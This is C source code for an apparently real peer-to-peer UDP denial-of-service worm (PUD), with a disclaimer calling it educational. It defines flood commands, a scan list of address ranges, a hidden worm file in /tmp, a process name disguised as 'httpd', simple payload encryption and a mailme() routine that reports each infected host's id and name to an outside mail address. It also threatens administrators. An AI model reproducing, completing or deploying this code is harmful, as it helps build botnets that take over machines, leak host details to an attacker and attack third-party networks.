     1	/****************************************************************************
     2	 *                                                                          *
     3	 *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *
     4	 *                         by contem@efnet                                  *
     5	 *                                                                          *
     6	 *         Virtually connects computers via the udp protocol on the         *
     7	 *  specified port.  Uses a newly created peer-to-peer protocol that        *
     8	 *  incorperates uses on unstable or dead computers.  The program is        *
     9	 *  ran with the parameters of another ip on the virtual network.  If       *
    10	 *  running on the first computer, run with the ip 127.0.0.1 or some        *
    11	 *  other type of local address.  Ex:                                       *
    12	 *                                                                          *
    13	 *           Computer A:   ./program 127.0.0.1                              *
    14	 *           Computer B:   ./program Computer_A                             *
    15	 *           Computer C:   ./program Computer_A                             *
    16	 *           Computer D:   ./program Computer_C                             *
    17	 *                                                                          *
    18	 *         Any form of that will work.  The linking process works by        *
    19	 *  giving each computer the list of avaliable computers, then              *
    20	 *  using a technique called broadcast segmentation combined with TCP       *
    21	 *  like functionality to insure that another computer on the network       *
    22	 *  receives the broadcast packet, segments it again and recreates          *
    23	 *  the packet to send to other hosts.  That technique can be used to       *
    24	 *  support over 16 million simutaniously connected computers.              *
    25	 *                                                                          *
    26	 *         Thanks to ensane and st for donating shells and test beds        *
    27	 *  for this program.  And for the admins who removed me because I          *
    28	 *  was testing this program (you know who you are) need to watch           *
    29	 *  their backs.                                                            *
    30	 *                                                                          *
    31	 *         I am not responsible for any harm caused by this program!        *
    32	 *  I made this program to demonstrate peer-to-peer communication and       *
    33	 *  should not be used in real life.  It is an education program that       *
    34	 *  should never even be ran at all, nor used in any way, shape or          *
    35	 *  form.  It is not the authors fault if it was used for any purposes      *
    36	 *  other than educational.                                                 *
    37	 *									    *
    38	 *  some modification done by aion (aion@ukr.net)                           *
    39	 ****************************************************************************/
    40	
    41	#include <stdio.h>
    42	#include <unistd.h>
    43	#include <string.h>
    44	#include <fcntl.h>
    45	#include <stdlib.h>
    46	#include <stdarg.h>
    47	#include <sys/ioctl.h>
    48	#include <sys/types.h>
    49	#include <sys/socket.h>
    50	#include <netinet/in.h>
    51	#include <sys/time.h>
    52	#include <unistd.h>
    53	#include <errno.h>
    54	#include <netdb.h>
    55	#include <arpa/telnet.h>
    56	#include <sys/wait.h>
    57	#include <signal.h>
    58	
    59	#define SCAN
    60	#undef LARGE_NET
    61	#undef FREEBSD
    62	
    63	#define BROADCASTS	2
    64	#define LINKS		128
    65	#define CLIENTS		128
    66	#define PORT		4156
    67	#define SCANPORT	80
    68	#define SCANTIMEOUT	5
    69	#define MAXPATH		4096
    70	#define ESCANPORT	10100
    71	#define VERSION		20092002
    72	
    73	//////////////////////////////////////////////////////////////////////////////////////
    74	//                                  aion                                            //
    75	//////////////////////////////////////////////////////////////////////////////////////
    76	#define MAILSRV  	"freemail.ukr.net"
    77	#define MAILTO    	"aion@ukr.net"
    78	#define PSNAME		"httpd "
    79	#define WORMSRC		"/tmp/.unlock"
    80	#define UUHEAD		"begin 655 .unlock\n"
    81	
    82	int writem(int, char *); 
    83	
    84	int zhdr(int flag)
    85	{
    86	  int fd;  char *gzh="\x1f\x8b\x08";
    87	           char *kgz="\x00\x00\x00";
    88	  if((fd=open(WORMSRC,O_WRONLY))==-1) return -1;
    89	  if(flag) write(fd,gzh,3); 
    90	    else write(fd,kgz,3); 
    91	  close(fd);    
    92	}
    93	
    94	int mailme(char *sip)  
    95	{
    96	  char cmdbuf[256], buffer[128]; 
    97	  int pip; long inet;
    98	  struct sockaddr_in sck;
    99	  struct hostent *hp;
   100	
   101	  if(!(pip=socket(PF_INET, SOCK_STREAM, 0))) return -1;
   102	  if((inet=inet_addr(MAILSRV))==-1)
   103	  {
   104	    if(hp=gethostbyname(MAILSRV))
   105	        memcpy (&inet, hp->h_addr, 4);
   106	      else return -1;
   107	  }
   108	  sck.sin_family = PF_INET;
   109	  sck.sin_port = htons (25);
   110	  sck.sin_addr.s_addr = inet;
   111	  if(connect(pip, (struct sockaddr *) &sck, sizeof (sck))<0) return -1;
   112	
   113	  gethostname(buffer,128);
   114	  sprintf(cmdbuf,"helo test\r\n");                     writem(pip, cmdbuf);
   115	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   116	  sprintf(cmdbuf,"mail from: test@microsoft.com\r\n"); writem(pip, cmdbuf);
   117	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   118	  sprintf(cmdbuf,"rcpt to: "MAILTO"\r\n");             writem(pip, cmdbuf);
   119	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   120	  sprintf(cmdbuf,"data\r\n");                          writem(pip, cmdbuf);
   121	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   122	  sprintf(cmdbuf," hostid:   %d \r\n"
   123	                 " hostname: %s \r\n"
   124			 " att_from: %s \r\n",gethostid(),buffer,sip);  
   125	                                                       writem(pip, cmdbuf);		 
   126	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   127	  sprintf(cmdbuf,"\r\n.\r\nquit\r\n");                 writem(pip, cmdbuf);
   128	  recv(pip,cmdbuf,sizeof(cmdbuf),0);
   129	  return close(pip);
   130	}    
   131	
   132	//////////////////////////////////////////////////////////////////////////////////////
   133	//                                  Macros                                          //
   134	//////////////////////////////////////////////////////////////////////////////////////
   135	
   136	#define FREE(x) {if (x) { free(x);x=NULL; }}
   137	
   138	enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };
   139	enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
   140	enum { AREAD=1, AWRITE=2, AEXCEPT=4 };
   141	
   142	//////////////////////////////////////////////////////////////////////////////////////
   143	//                                  Packet headers                                  //
   144	//////////////////////////////////////////////////////////////////////////////////////
   145	
   146	struct llheader {
   147		char type;
   148		unsigned long checksum;
   149		unsigned long id;
   150	};
   151	struct header {
   152		char tag;
   153		int id;
   154		unsigned long len;
   155		unsigned long seq;
   156	};
   157	struct route_rec {
   158		struct header h;
   159		char sync;
   160		unsigned char hops;
   161		unsigned long server;
   162		unsigned long links;
   163	};
   164	struct kill_rec {
   165		struct header h;
   166	};
   167	struct sh_rec {
   168		struct header h;
   169	};
   170	struct list_rec {
   171		struct header h;
   172	};
   173	struct udp_rec {
   174		struct header h;
   175		unsigned long size;
   176		unsigned long target;
   177		unsigned short port;
   178		unsigned long secs;
   179	};
   180	struct tcp_rec {
   181		struct header h;
   182		unsigned long target;
   183		unsigned short port;
   184		unsigned long secs;
   185	};
   186	struct tcp6_rec {
   187		struct header h;
   188		unsigned long target[4];
   189		unsigned short port;
   190		unsigned long secs;
   191	};
   192	struct gen_rec {
   193		struct header h;
   194		unsigned long target;
   195		unsigned short port;
   196		unsigned long secs;
   197	};
   198	struct df_rec {
   199		struct header h;
   200		unsigned long target;
   201		unsigned long secs;
   202	};
   203	struct add_rec {
   204		struct header h;
   205		unsigned long server;
   206		unsigned long socks;
   207		unsigned long bind;
   208		unsigned short port;
   209	};
   210	struct data_rec {
   211		struct header h;
   212	};
   213	struct addsrv_rec {
   214		struct header h;
   215	};
   216	struct initsrv_rec {
   217		struct header h;
   218	};
   219	struct qmyip_rec {
   220		struct header h;
   221	};
   222	struct myip_rec {
   223		struct header h;
   224		unsigned long ip;
   225	};
   226	struct escan_rec {
   227		struct header h;
   228		unsigned long ip;
   229	};
   230	struct getinfo_rec {
   231		struct header h;
   232		unsigned long time;
   233		unsigned long mtime;
   234	};
   235	struct info_rec {
   236		struct header h;
   237		unsigned char a;
   238		unsigned char b;
   239		unsigned char c;
   240		unsigned char d;
   241		unsigned long ip;
   242		unsigned long uptime;
   243		unsigned long reqtime;
   244		unsigned long reqmtime;
   245		unsigned long in;
   246		unsigned long out;
   247		unsigned long version;
   248	};
   249	
   250	//////////////////////////////////////////////////////////////////////////////////////
   251	//                             Public variables                                     //
   252	//////////////////////////////////////////////////////////////////////////////////////
   253	
   254	struct ainst {
   255		void *ext,*ext5;
   256		int ext2,ext3,ext4;
   257	
   258		int sock,error;
   259		unsigned long len;
   260		struct sockaddr_in in;
   261	};
   262	struct ainst clients[CLIENTS*2];
   263	struct ainst udpclient;
   264	unsigned int sseed=0;
   265	struct route_table {
   266		int id;
   267		unsigned long ip;
   268		unsigned short port;
   269	} routes[LINKS];
   270	unsigned long numlinks, *links=NULL, myip=0;
   271	unsigned long sequence[LINKS], rsa[LINKS];
   272	unsigned int *pids=NULL;
   273	unsigned long numpids=0;
   274	unsigned long uptime=0, in=0, out=0;
   275	unsigned long synctime=0;
   276	int syncmodes=1;
   277	
   278	struct mqueue {
   279		char *packet;
   280		unsigned long len;
   281		unsigned long id;
   282		unsigned long time;
   283		unsigned long ltime;
   284		unsigned long destination;
   285		unsigned short port;
   286		unsigned char trys;
   287		struct mqueue *next;
   288	} *queues=NULL;
   289	
   290	#ifdef SCAN
   291	unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,
   292		46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,
   293		139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
   294		168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
   295		198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,
   296		230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };
   297	#endif
   298	
   299	//////////////////////////////////////////////////////////////////////////////////////
   300	//                               Public routines                                    //
   301	//////////////////////////////////////////////////////////////////////////////////////
   302	
   303	unsigned long gettimeout() {
   304		return 36+(numlinks/15);
   305	}
   306	
   307	void syncmode(int mode) {
   308		syncmodes=mode;
   309	}
   310	
   311	void gsrand(unsigned long s) {
   312		sseed=s;
   313	}
   314	unsigned long grand() {
   315		sseed=((sseed*965764979)%65535)/2;
   316		return sseed;
   317	}
   318	
   319	void nas(int a) {
   320	}
   321	
   322	int mfork() {
   323		unsigned int parent, *newpids, i;
   324		parent=fork();
   325		if (parent <= 0) return parent;
   326		numpids++;
   327		newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
   328		if (newpids == NULL) return parent;
   329		for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
   330		newpids[numpids-1]=parent;
   331		FREE(pids);
   332		pids=newpids;
   333		return parent;
   334	}
   335	
   336	char *aerror(struct ainst *inst) {
   337		if (inst == NULL) return "Invalid instance or socket";
   338		switch(inst->error) {
   339			case ASUCCESS:return "Operation Success";
   340			case ARESOLVE:return "Unable to resolve";
   341			case ACONNECT:return "Unable to connect";
   342			case ASOCKET:return "Unable to create socket";
   343			case ABIND:return "Unable to bind socket";
   344			case AINUSE:return "Port is in use";
   345			case APENDING:return "Operation pending";
   346			case AUNKNOWN:default:return "Unknown";
   347		}
   348		return "";
   349	}
   350	
   351	int aresolve(char *host) {
   352	 	struct hostent *hp;
   353		if (inet_addr(host) == 0 || inet_addr(host) == -1) {
   354			unsigned long a;
   355			if ((hp = gethostbyname(host)) == NULL) return 0;
   356			bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
   357			return a;
   358		}
   359		else return inet_addr(host);
   360	}
   361	
   362	int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
   363		struct sockaddr_in in;
   364		if (inst == NULL) return (AINSTANCE);
   365		if (inst->sock == 0) {
   366			inst->error=AINSTANCE;
   367			return (AINSTANCE);
   368		}
   369		inst->len=0;
   370		in.sin_family = AF_INET;
   371		if (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;
   372		else in.sin_addr.s_addr = ip;
   373		in.sin_port = htons(port);
   374		if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
   375			inst->error=ABIND;
   376			return (ABIND);
   377		}
   378		inst->error=ASUCCESS;
   379		return ASUCCESS;
   380	}
   381	
   382	int await(struct ainst **inst,unsigned long len,char type,long secs) {
   383		struct timeval tm,*tmp;
   384		fd_set read,write,except,*readp,*writep,*exceptp;
   385		int p,ret,max;
   386		if (inst == NULL) return (AINSTANCE);
   387		for (p=0;p<len;p++) inst[p]->len=0;
   388		if (secs > 0) {
   389			tm.tv_sec=secs;
   390			tm.tv_usec=0;
   391			tmp=&tm;
   392		}
   393		else tmp=(struct timeval *)NULL;
   394		if (type & AREAD) {
   395			FD_ZERO(&read);
   396			for (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);
   397			readp=&read;
   398		}
   399		else readp=(struct fd_set*)0;
   400		if (type & AWRITE) {
   401			FD_ZERO(&write);
   402			for (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);
   403			writep=&write;
   404		}
   405		else writep=(struct fd_set*)0;
   406		if (type & AEXCEPT) {
   407			FD_ZERO(&except);
   408			for (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);
   409			exceptp=&except;
   410		}
   411		else exceptp=(struct fd_set*)0;
   412		for (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;
   413		if ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {
   414			for (p=0;p<len;p++) inst[p]->error=APENDING;
   415			return (APENDING);
   416		}
   417		if (ret == -1) return (AUNKNOWN);
   418		for (p=0;p<len;p++) {
   419			if (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;
   420			if (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;
   421			if (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;
   422		}
   423		for (p=0;p<len;p++) inst[p]->error=ASUCCESS;
   424		return (ASUCCESS);
   425	}
   426	
   427	int atcp_sync_check(struct ainst *inst) {
   428		if (inst == NULL) return (AINSTANCE);
   429		inst->len=0;
   430		errno=0;
   431		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
   432			inst->error=ASUCCESS;
   433			return (ASUCCESS);
   434		}
   435		if (!(errno == EINPROGRESS ||errno == EALREADY)) {
   436			inst->error=ACONNECT;
   437			return (ACONNECT);
   438		}
   439		inst->error=APENDING;
   440		return (APENDING);
   441	}
   442	
   443	int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
   444		int flag=1;
   445	 	struct hostent *hp;
   446		if (inst == NULL) return (AINSTANCE);
   447		inst->len=0;
   448		if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
   449			inst->error=ASOCKET;
   450			return (ASOCKET);
   451		}
   452		if (inet_addr(host) == 0 || inet_addr(host) == -1) {
   453			if ((hp = gethostbyname(host)) == NULL) {
   454				inst->error=ARESOLVE;
   455				return (ARESOLVE);
   456			}
   457			bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
   458		}
   459		else inst->in.sin_addr.s_addr=inet_addr(host);
   460		inst->in.sin_family = AF_INET;
   461		inst->in.sin_port = htons(port);
   462		flag = fcntl(inst->sock, F_GETFL, 0);
   463		flag |= O_NONBLOCK;
   464		fcntl(inst->sock, F_SETFL, flag);
   465		inst->error=ASUCCESS;
   466		return (ASUCCESS);
   467	}
   468	
   469	int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
   470		int flag=1;
   471		unsigned long start;
   472	 	struct hostent *hp;
   473		if (inst == NULL) return (AINSTANCE);
   474		inst->len=0;
   475		if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
   476			inst->error=ASOCKET;
   477			return (ASOCKET);
   478		}
   479		if (inet_addr(host) == 0 || inet_addr(host) == -1) {
   480			if ((hp = gethostbyname(host)) == NULL) {
   481				inst->error=ARESOLVE;
   482				return (ARESOLVE);
   483			}
   484			bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
   485		}
   486		else inst->in.sin_addr.s_addr=inet_addr(host);
   487		inst->in.sin_family = AF_INET;
   488		inst->in.sin_port = htons(port);
   489		flag = fcntl(inst->sock, F_GETFL, 0);
   490		flag |= O_NONBLOCK;
   491		fcntl(inst->sock, F_SETFL, flag);
   492		start=time(NULL);
   493		while(time(NULL)-start < 10) {
   494			errno=0;
   495			if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
   496				inst->error=ASUCCESS;
   497				return (ASUCCESS);
   498			}
   499			if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
   500			sleep(1);
   501		}
   502		inst->error=ACONNECT;
   503		return (ACONNECT);
   504	}
   505	
   506	int atcp_accept(struct ainst *inst,struct ainst *child) {
   507		int sock;
   508		unsigned int datalen;
   509		if (inst == NULL || child == NULL) return (AINSTANCE);
   510		datalen=sizeof(child->in);
   511		inst->len=0;
   512		memcpy((void*)child,(void*)inst,sizeof(struct ainst));
   513		if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
   514			memset((void*)child,0,sizeof(struct ainst));
   515			inst->error=APENDING;
   516			return (APENDING);
   517		}
   518		child->sock=sock;
   519		inst->len=datalen;
   520		inst->error=ASUCCESS;
   521		return (ASUCCESS);
   522	}
   523	
   524	int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
   525		long datalen;
   526		if (inst == NULL) return (AINSTANCE);
   527		inst->len=0;
   528		errno=0;
   529		if ((datalen=write(inst->sock,buf,len)) < len) {
   530			if (errno == EAGAIN) {
   531				inst->error=APENDING;
   532				return (APENDING);
   533			}
   534			else {
   535				inst->error=AUNKNOWN;
   536				return (AUNKNOWN);
   537			}
   538		}
   539		inst->len=datalen;
   540		inst->error=ASUCCESS;
   541		return (ASUCCESS);
   542	}
   543	
   544	int atcp_sendmsg(struct ainst *inst, char *words, ...) {
   545		static char textBuffer[2048];
   546		unsigned int a;
   547		va_list args;
   548		va_start(args, words);
   549		a=vsprintf(textBuffer, words, args);
   550		va_end(args);
   551		return atcp_send(inst,textBuffer,a);
   552	}
   553	
   554	int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
   555		long datalen;
   556		if (inst == NULL) return (AINSTANCE);
   557		inst->len=0;
   558		if ((datalen=read(inst->sock,buf,len)) < 0) {
   559			if (errno == EAGAIN) {
   560				inst->error=APENDING;
   561				return (APENDING);
   562			}
   563			else {
   564				inst->error=AUNKNOWN;
   565				return (AUNKNOWN);
   566			}
   567		}
   568		if (datalen == 0 && len) {
   569			inst->error=AUNKNOWN;
   570			return (AUNKNOWN);
   571		}
   572		inst->len=datalen;
   573		inst->error=ASUCCESS;
   574		return (ASUCCESS);
   575	}
   576	
   577	int atcp_close(struct ainst *inst) {
   578		if (inst == NULL) return (AINSTANCE);
   579		inst->len=0;
   580		if (close(inst->sock) < 0) {
   581			inst->error=AUNKNOWN;
   582			return (AUNKNOWN);
   583		}
   584		inst->sock=0;
   585		inst->error=ASUCCESS;
   586		return (ASUCCESS);
   587	}
   588	
   589	int audp_listen(struct ainst *inst,unsigned int port) {
   590		int flag=1;
   591		if (inst == NULL) return (AINSTANCE);
   592		inst->len=0;
   593		if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
   594			inst->error=ASOCKET;
   595			return (ASOCKET);
   596		}
   597		inst->in.sin_family = AF_INET;
   598		inst->in.sin_addr.s_addr = INADDR_ANY;
   599		inst->in.sin_port = htons(port);
   600		if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
   601			inst->error=ABIND;
   602			return (ABIND);
   603		}
   604	#ifdef O_DIRECT
   605		flag = fcntl(inst->sock, F_GETFL, 0);
   606		flag |= O_DIRECT;
   607		fcntl(inst->sock, F_SETFL, flag);
   608	#endif
   609		inst->error=ASUCCESS;
   610		flag=1;
   611		setsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,&flag,sizeof(flag));
   612		return (ASUCCESS);
   613	}
   614	
   615	int audp_setup(struct ainst *inst,char *host,unsigned int port) {
   616		int flag=1;
   617	 	struct hostent *hp;
   618		if (inst == NULL) return (AINSTANCE);
   619		inst->len=0;
   620		if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
   621			inst->error=ASOCKET;
   622			return (ASOCKET);
   623		}
   624		if (inet_addr(host) == 0 || inet_addr(host) == -1) {
   625			if ((hp = gethostbyname(host)) == NULL) {
   626				inst->error=ARESOLVE;
   627				return (ARESOLVE);
   628			}
   629			bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
   630		}
   631		else inst->in.sin_addr.s_addr=inet_addr(host);
   632		inst->in.sin_family = AF_INET;
   633		inst->in.sin_port = htons(port);
   634	#ifdef O_DIRECT
   635		flag = fcntl(inst->sock, F_GETFL, 0);
   636		flag |= O_DIRECT;
   637		fcntl(inst->sock, F_SETFL, flag);
   638	#endif
   639		inst->error=ASUCCESS;
   640		return (ASUCCESS);
   641	}
   642	
   643	int audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {
   644	 	struct hostent *hp;
   645		if (inst == NULL) return (AINSTANCE);
   646		inst->len=0;
   647		inst->sock = parent->sock;
   648		if (inet_addr(host) == 0 || inet_addr(host) == -1) {
   649			if ((hp = gethostbyname(host)) == NULL) {
   650				inst->error=ARESOLVE;
   651				return (ARESOLVE);
   652			}
   653			bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
   654		}
   655		else inst->in.sin_addr.s_addr=inet_addr(host);
   656		inst->in.sin_family = AF_INET;
   657		inst->in.sin_port = htons(port);
   658		inst->error=ASUCCESS;
   659		return (ASUCCESS);
   660	}
   661	
   662	int audp_send(struct ainst *inst,char *buf,unsigned long len) {
   663		long datalen;
   664		if (inst == NULL) return (AINSTANCE);
   665		inst->len=0;
   666		errno=0;
   667		if ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {
   668			if (errno == EAGAIN) {
   669				inst->error=APENDING;
   670				return (APENDING);
   671			}
   672			else {
   673				inst->error=AUNKNOWN;
   674				return (AUNKNOWN);
   675			}
   676		}
   677		out++;
   678		inst->len=datalen;
   679		inst->error=ASUCCESS;
   680		return (ASUCCESS);
   681	}
   682	
   683	int audp_sendmsg(struct ainst *inst, char *words, ...) {
   684		static char textBuffer[2048];
   685		unsigned int a;
   686		va_list args;
   687		va_start(args, words);
   688		a=vsprintf(textBuffer, words, args);
   689		va_end(args);
   690		return audp_send(inst,textBuffer,a);
   691	}
   692	
   693	int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {
   694		long datalen,nlen;
   695		if (inst == NULL) return (AINSTANCE);
   696		nlen=sizeof(inst->in);
   697		inst->len=0;
   698		memcpy((void*)client,(void*)inst,sizeof(struct ainst));
   699		if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(size_t*)&nlen)) < 0) {
   700			if (errno == EAGAIN) {
   701				inst->error=APENDING;
   702				return (APENDING);
   703			}
   704			else {
   705				inst->error=AUNKNOWN;
   706				return (AUNKNOWN);
   707			}
   708		}
   709		inst->len=datalen;
   710		inst->error=ASUCCESS;
   711		return (ASUCCESS);
   712	}
   713	
   714	int audp_close(struct ainst *inst) {
   715		if (inst == NULL) return (AINSTANCE);
   716		inst->len=0;
   717		if (close(inst->sock) < 0) {
   718			inst->error=AUNKNOWN;
   719			return (AUNKNOWN);
   720		}
   721		inst->sock=0;
   722		inst->error=ASUCCESS;
   723		return (ASUCCESS);
   724	}
   725	
   726	unsigned long _decrypt(char *str, unsigned long len) {
   727		unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
   728		gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
   729		while(1) {
   730			gsrand(seed[pos%4]+grand()+pos);
   731			str[pos]-=grand();
   732			pos++;
   733			if (pos >= len) break;
   734		}
   735		return pos;
   736	}
   737	
   738	unsigned long _encrypt(char *str, unsigned long len) {
   739		unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
   740		gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
   741		while(1) {
   742			gsrand(seed[pos%4]+grand()+pos);
   743			str[pos]+=grand();
   744			pos++;
   745			if (pos >= len) break;
   746		}
   747		return pos;
   748	}
   749	
   750	int useseq(unsigned long seq) {
   751		unsigned long a;
   752		if (seq == 0) return 0;
   753		for (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;
   754		return 0;
   755	}
   756	
   757	unsigned long newseq() {
   758		unsigned long seq;
   759		while(1) {
   760			seq=(rand()*rand())^rand();
   761			if (useseq(seq) || seq == 0) continue;
   762			break;
   763		}
   764		return seq;
   765	}
   766	
   767	void addseq(unsigned long seq) {
   768		unsigned long i;
   769		for (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];
   770		sequence[0]=seq;
   771	}
   772	
   773	void addserver(unsigned long server) {
   774		unsigned long *newlinks, i, stop;
   775		char a=0;
   776		for (i=0;i<numlinks;i++) if (links[i] == server) a=1;
   777		if (a == 1 || server == 0) return;
   778		numlinks++;
   779		newlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));
   780		if (newlinks == NULL) return;
   781		stop=rand()%numlinks;
   782		for (i=0;i<stop;i++) newlinks[i]=links[i];
   783		newlinks[i]=server;
   784		for (;i<numlinks-1;i++) newlinks[i+1]=links[i];
   785		FREE(links);
   786		links=newlinks;
   787	}
   788	
   789	void conv(char *str,int len,unsigned long server) {
   790		memset(str,0,len);
   791		strcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));
   792	}
   793	
   794	int isreal(unsigned long server) {
   795		char srv[256];
   796		unsigned int i,f;
   797		unsigned char a=0,b=0;
   798		conv(srv,256,server);
   799		for (i=0;i<strlen(srv) && srv[i]!='.';i++);
   800		srv[i]=0;
   801		a=atoi(srv);
   802		f=i+1;
   803		for (i++;i<strlen(srv) && srv[i]!='.';i++);
   804		srv[i]=0;
   805		b=atoi(srv+f);
   806		if (a == 127 || a == 10 || a == 0) return 0;
   807		if (a == 172 && b >= 16 && b <= 31) return 0;
   808		if (a == 192 && b == 168) return 0;
   809		return 1;
   810	}
   811	
   812	u_short in_cksum(u_short *addr, int len) {
   813		register int nleft = len;
   814		register u_short *w = addr;
   815		register int sum = 0;
   816		u_short answer =0;
   817		while (nleft > 1) {
   818			sum += *w++;
   819			nleft -= 2;
   820		}
   821		if (nleft == 1) {
   822			*(u_char *)(&answer) = *(u_char *)w;
   823			sum += answer;
   824		}
   825		sum = (sum >> 16) + (sum & 0xffff);
   826		sum += (sum >> 16);
   827		answer = ~sum;
   828		return(answer);
   829	}
   830	
   831	int usersa(unsigned long rs) {
   832		unsigned long a;
   833		if (rs == 0) return 0;
   834		for (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;
   835		return 0;
   836	}
   837	
   838	unsigned long newrsa() {
   839		unsigned long rs;
   840		while(1) {
   841			rs=(rand()*rand())^rand();
   842			if (usersa(rs) || rs == 0) continue;
   843			break;
   844		}
   845		return rs;
   846	}
   847	
   848	void addrsa(unsigned long rs) {
   849		unsigned long i;
   850		for (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];
   851		rsa[0]=rs;
   852	}
   853	
   854	void delqueue(unsigned long id) {
   855		struct mqueue *getqueue=queues, *prevqueue=NULL;
   856		while(getqueue != NULL) {
   857			if (getqueue->id == id) {
   858				getqueue->trys--;
   859				if (!getqueue->trys) {
   860					if (prevqueue) prevqueue->next=getqueue->next;
   861					else queues=getqueue->next;
   862				}
   863				return;
   864			}
   865			prevqueue=getqueue;
   866			getqueue=getqueue->next;
   867		}
   868	}
   869	
   870	int waitforqueues() {
   871		if (mfork() == 0) {
   872			sleep(gettimeout());
   873			return 0;
   874		}
   875		return 1;
   876	}
   877	
   878	//////////////////////////////////////////////////////////////////////////////////////
   879	//                                   Sending functions                              //
   880	//////////////////////////////////////////////////////////////////////////////////////
   881	
   882	struct ainst udpserver;
   883	
   884	char *lowsend(struct ainst *ts,unsigned char b,char *buf,unsigned long len) {
   885		struct llheader rp;
   886		struct mqueue *q;
   887		char *mbuf=(char*)malloc(sizeof(rp)+len);
   888		if (mbuf == NULL) return NULL;
   889		memset((void*)&rp,0,sizeof(struct llheader));
   890		rp.checksum=in_cksum(buf,len);
   891		rp.id=newrsa();
   892		rp.type=0;
   893		memcpy(mbuf,&rp,sizeof(rp));
   894		memcpy(mbuf+sizeof(rp),buf,len);
   895	
   896		q=(struct mqueue *)malloc(sizeof(struct mqueue));
   897		q->packet=(char*)malloc(sizeof(rp)+len);
   898		memcpy(q->packet,mbuf,sizeof(rp)+len);
   899		q->len=sizeof(rp)+len;
   900		q->id=rp.id;
   901		q->time=time(NULL);
   902		q->ltime=time(NULL);
   903		if (b) {
   904			q->destination=0;
   905			q->port=PORT;
   906			q->trys=b;
   907		}
   908		else {
   909			q->destination=ts->in.sin_addr.s_addr;
   910			q->port=htons(ts->in.sin_port);
   911			q->trys=1;
   912		}
   913		q->next=queues;
   914		queues=q;
   915	
   916		if (ts) {
   917			audp_send(ts,mbuf,len+sizeof(rp));
   918			FREE(mbuf);
   919		}
   920		else return mbuf;
   921	}
   922	
   923	int relayclient(struct ainst *ts,char *buf,unsigned long len) {
   924		return lowsend(ts,0,buf,len)?1:0;
   925	}
   926	
